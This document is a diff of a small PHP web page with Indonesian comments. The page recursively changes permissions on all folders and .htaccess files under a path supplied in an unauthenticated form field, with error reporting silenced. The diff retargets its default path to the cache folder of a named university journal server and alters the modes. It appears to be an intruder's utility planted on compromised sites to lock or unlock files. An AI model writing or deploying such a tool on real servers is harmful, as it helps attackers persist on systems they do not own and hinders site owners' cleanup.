@@ -1,11 +1,11 @@
 <?php
 // ============================================================
-//  UBAH CHMOD FOLDER PLUGINS JADI 0555 DAN .htaccess JADI 0444
+//  UBAH CHMOD FOLDER PLUGINS JADI 0755 DAN .htaccess JADI 0555
 // ============================================================
 set_time_limit(0);
 error_reporting(0);
 
-$defaultPath = '/home/ejournal/public_html/plugins/';
+$defaultPath = '/www/wwwroot/journal1.uinssc.ac.id/cache/';
 $scanPath = isset($_POST['target_path']) && !empty($_POST['target_path']) 
             ? $_POST['target_path'] 
             : $defaultPath;
@@ -31,15 +31,15 @@ if (isset($_POST['chmod'])) {
         foreach ($iterator as $item) {
             $path = $item->getPathname();
             if ($item->isDir()) {
-                // Ubah permission folder ke 0555
-                if (chmod($path, 0555)) {
+                // Ubah permission folder ke 0755
+                if (chmod($path, 0755)) {
                     $folderCount++;
                 } else {
                     $errors[] = "Gagal chmod folder: " . str_replace($scanPath, '', $path);
                 }
             } elseif ($item->isFile() && $item->getFilename() === '.htaccess') {
-                // Ubah permission file .htaccess ke 0444
-                if (chmod($path, 0444)) {
+                // Ubah permission file .htaccess ke 0555
+                if (chmod($path, 0555)) {
                     $fileCount++;
                 } else {
                     $errors[] = "Gagal chmod .htaccess: " . str_replace($scanPath, '', $path);
@@ -48,8 +48,8 @@ if (isset($_POST['chmod'])) {
         }
 
         $message = "✅ Berhasil mengubah permission:<br>
-        - Folder: <strong>$folderCount</strong> menjadi 0555<br>
-        - .htaccess: <strong>$fileCount</strong> menjadi 0444<br>
+        - Folder: <strong>$folderCount</strong> menjadi 0755<br>
+        - .htaccess: <strong>$fileCount</strong> menjadi 0555<br>
         Path: <code>" . htmlspecialchars($scanPath) . "</code>";
         if (!empty($errors)) {
             $message .= "<br>⚠️ " . implode('<br>', $errors);
@@ -84,7 +84,7 @@ if (isset($_POST['chmod'])) {
         </div>
     <?php endif; ?>
     <div class="info">
-        <strong>Peringatan:</strong> Tindakan ini akan mengubah semua folder menjadi <code>0555</code> dan file <code>.htaccess</code> menjadi <code>0444</code> di dalam path yang dipilih beserta seluruh subfoldernya.
+        <strong>Peringatan:</strong> Tindakan ini akan mengubah semua folder menjadi <code>0755</code> dan file <code>.htaccess</code> menjadi <code>0555</code> di dalam path yang dipilih beserta seluruh subfoldernya.
     </div>
     <form method="post">
         <label><strong>Path Tujuan:</strong></label>
